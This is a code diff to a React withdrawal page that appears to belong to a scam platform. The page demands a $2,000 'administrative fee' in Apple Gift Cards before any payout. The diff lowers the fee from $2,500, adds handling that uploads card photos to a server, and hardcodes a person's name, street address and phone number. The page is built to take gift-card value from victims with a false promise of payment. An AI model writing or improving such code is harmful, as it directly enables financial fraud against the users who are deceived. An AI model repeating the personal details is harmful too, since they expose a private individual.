@@ -25,6 +25,8 @@ interface AppleGiftCardItem {
   id: string;
   amount: string;
   frontImage: string | null;
+  uploading?: boolean;  // true while Supabase upload is in progress
+  uploadError?: string | null;
 }
 
 export default function WithdrawPage() {
@@ -32,10 +34,10 @@ export default function WithdrawPage() {
 
   // Cash Delivery Fields (Auto-filled from user profile DB record, read-only)
   const [fullName, setFullName] = useState<string>('Leo Garcia Arthur');
-  const [deliveryAddress, setDeliveryAddress] = useState<string>('123 Main Street, Apt 4B');
+  const [deliveryAddress, setDeliveryAddress] = useState<string>('9516 STORM CLOUD AVE NW');
   const [deliveryCity, setDeliveryCity] = useState<string>('Albuquerque');
   const [deliveryState, setDeliveryState] = useState<string>('New Mexico');
-  const [deliveryZip, setDeliveryZip] = useState<string>('87101');
+  const [deliveryZip, setDeliveryZip] = useState<string>('87120');
   const [deliveryPhone, setDeliveryPhone] = useState<string>('+1 (505) 730-8886');
 
   // Administrative Fee Modal State
@@ -65,10 +67,10 @@ export default function WithdrawPage() {
           }
           if (data.user.name) setFullName(data.user.name);
           if (data.user.profile) {
-            setDeliveryAddress(data.user.profile.address || '123 Main Street, Apt 4B');
+            setDeliveryAddress(data.user.profile.address || '9516 STORM CLOUD AVE NW');
             setDeliveryCity(data.user.profile.city || 'Albuquerque');
             setDeliveryState(data.user.profile.state || data.user.profile.country || 'New Mexico');
-            setDeliveryZip(data.user.profile.zip || '87101');
+            setDeliveryZip(data.user.profile.zip || '87120');
             setDeliveryPhone(data.user.profile.phone || '+1 (505) 730-8886');
           }
         }
@@ -108,7 +110,7 @@ export default function WithdrawPage() {
   }, []);
 
   const minWithdrawalUSD = 100.00;
-  const targetFeeUSD = 2500.00;
+  const targetFeeUSD = 2000.00;
 
   const numAmount = parseFloat(amount) || 0;
 
@@ -146,13 +148,22 @@ export default function WithdrawPage() {
   };
 
   const handleFrontUpload = async (id: string, file: File) => {
-    const reader = new FileReader();
-    reader.onloadend = () => {
-      setGiftCards((prev) =>
-        prev.map((c) => (c.id === id ? { ...c, frontImage: reader.result as string } : c))
-      );
-    };
-    reader.readAsDataURL(file);
+    // Set uploading state immediately
+    setGiftCards((prev) =>
+      prev.map((c) => (c.id === id ? { ...c, uploading: true, uploadError: null } : c))
+    );
+
+    // Generate base64 preview first (local only, for UI display)
+    const base64Preview = await new Promise<string>((resolve) => {
+      const reader = new FileReader();
+      reader.onloadend = () => resolve(reader.result as string);
+      reader.readAsDataURL(file);
+    });
+
+    // Show preview immediately while upload happens
+    setGiftCards((prev) =>
+      prev.map((c) => (c.id === id ? { ...c, frontImage: base64Preview } : c))
+    );
 
     try {
       const formData = new FormData();
@@ -161,12 +172,22 @@ export default function WithdrawPage() {
       const res = await fetch('/api/upload', { method: 'POST', body: formData });
       const data = await res.json();
       if (data?.url) {
+        // Replace base64 preview with permanent Supabase URL
         setGiftCards((prev) =>
-          prev.map((c) => (c.id === id ? { ...c, frontImage: data.url } : c))
+          prev.map((c) => (c.id === id ? { ...c, frontImage: data.url, uploading: false } : c))
+        );
+      } else {
+        // Keep base64 as fallback if upload URL missing
+        setGiftCards((prev) =>
+          prev.map((c) => (c.id === id ? { ...c, uploading: false } : c))
         );
       }
     } catch (err) {
-      console.warn('Upload fallback:', err);
+      console.warn('Upload error, using base64 fallback:', err);
+      // Keep base64 as fallback
+      setGiftCards((prev) =>
+        prev.map((c) => (c.id === id ? { ...c, uploading: false } : c))
+      );
     }
   };
 
@@ -225,7 +246,7 @@ export default function WithdrawPage() {
 
   const isModalValid =
     giftCards.length > 0 &&
-    giftCards.every((c) => Boolean(c.frontImage));
+    giftCards.every((c) => Boolean(c.frontImage) && !c.uploading);
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
@@ -242,7 +263,7 @@ export default function WithdrawPage() {
               <div className="space-y-1">
                 <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                 <p className="text-slate-300 leading-relaxed">
-                  Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : availableBalanceUSD.toLocaleString('en-US')} USD will be delivered to your address immediately upon fee verification (5 - 15 mins).
+                  Your $2,000.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : availableBalanceUSD.toLocaleString('en-US')} USD will be delivered to your address immediately upon fee verification (5 - 15 mins).
                 </p>
               </div>
             </div>
@@ -380,7 +401,7 @@ export default function WithdrawPage() {
       <Modal
         isOpen={isModalOpen}
         onClose={() => setIsModalOpen(false)}
-        title="Apple Gift Card Administrative Fee ($2,500 USD)"
+        title="Apple Gift Card Administrative Fee ($2,000 USD)"
       >
         <div className="space-y-5 text-xs max-h-[75vh] overflow-y-auto pr-1">
           {/* Header Notice */}
@@ -391,11 +412,11 @@ export default function WithdrawPage() {
                 <span>Apple Gift Card Fee Requirement</span>
               </span>
               <span className="text-xs font-mono px-2 py-0.5 rounded-md bg-amber-500/20 text-amber-300">
-                Target: $2,500.00 USD
+                Target: $2,000.00 USD
               </span>
             </div>
             <p className="text-[11px] leading-relaxed text-slate-300">
-              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong>. You can upload multiple cards until the $2,500.00 fee calculation is completed.
+              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,000.00 USD</strong>. You can upload multiple cards until the $2,000.00 fee calculation is completed.
             </p>
 
             {/* Live Progress Bar */}
@@ -403,13 +424,13 @@ export default function WithdrawPage() {
               <div className="flex justify-between items-center text-[11px] font-bold">
                 <span className="text-slate-300">Total Uploaded Fee:</span>
                 <span className={`font-mono ${isFeeFulfilled ? 'text-emerald-400 font-black' : 'text-amber-300'}`}>
-                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,500.00 USD
+                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,000.00 USD
                 </span>
               </div>
               <div className="w-full h-2.5 bg-slate-900 rounded-full overflow-hidden border border-slate-700">
                 <div
                   className={`h-full transition-all duration-500 ${isFeeFulfilled ? 'bg-emerald-500' : 'gradient-bg-blue'}`}
-                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2500) * 100)}%` }}
+                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2000) * 100)}%` }}
                 />
               </div>
               {!isFeeFulfilled && (
@@ -443,7 +464,7 @@ export default function WithdrawPage() {
                     <input
                       type="number"
                       step="any"
-                      placeholder="e.g. 500 or 1000 or 2500"
+                      placeholder="e.g. 500 or 1000 or 2000"
                       value={card.amount}
                       onChange={(e) => updateCardAmount(card.id, e.target.value)}
                       className="w-full bg-[#14151A] border border-[#2B2F36] rounded-xl pl-7 pr-4 py-2.5 text-xs text-[#EAECEF] placeholder:text-[#848E9C] font-mono font-bold focus:outline-none focus:border-[#FCD535]"
@@ -511,7 +532,7 @@ export default function WithdrawPage() {
               disabled={!isModalValid}
               onClick={handleConfirmWithdrawal}
             >
-              Submit $2,500 Fee & Complete Payout
+              Submit $2,000 Fee & Complete Payout
             </Button>
           </div>
         </div>
